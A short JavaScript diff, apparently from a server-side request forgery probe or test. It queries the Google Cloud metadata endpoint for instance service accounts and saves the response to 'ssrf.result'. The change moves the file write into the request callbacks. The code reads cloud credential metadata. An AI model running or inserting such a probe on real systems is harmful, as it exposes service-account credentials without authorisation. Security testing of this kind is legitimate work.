@@ -8,11 +8,9 @@ var result = '';
 
 axios.get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts", {headers: {'Metadata-Flavor': 'Google'}}, { transformResponse: (r) => r }).then((r) =>{
     result = JSON.stringify(r.data);   
+    fs.writeFileSync('ssrf.result', result);
 }, (error) => {
-    result = JSON.stringify(error);        
+    console.log(error);
+    result = JSON.stringify(error);    
+    fs.writeFileSync('ssrf.result', result);    
 });
-
-fs.writeFile('ssrf.result', result, function (err) {
-    if (err) return console.log(err);
-    console.log('ssrf');
-  });
